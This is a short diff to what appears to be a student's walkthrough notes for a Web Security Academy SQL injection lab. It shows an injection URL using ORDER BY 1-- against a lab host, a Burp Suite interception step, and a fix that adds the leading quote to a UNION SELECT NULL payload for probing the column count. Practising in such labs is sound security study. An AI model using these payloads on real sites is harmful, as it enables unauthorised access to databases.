@@ -6,4 +6,5 @@
  On the URL https://acec1fe41e2eeaf8c01ab94d00ef0051.web-security-academy.net/filter?category=Corporate+gifts' ORDER BY 1--
 
 Method 2 Use Burp Suite to Intercept the PROXY.
-USE : UNION select NULL,+NULL,+NULL-- {Untill the GET request is OK}
+USE : ' UNION select NULL,+NULL,+NULL-- {Untill the GET request is OK}
+
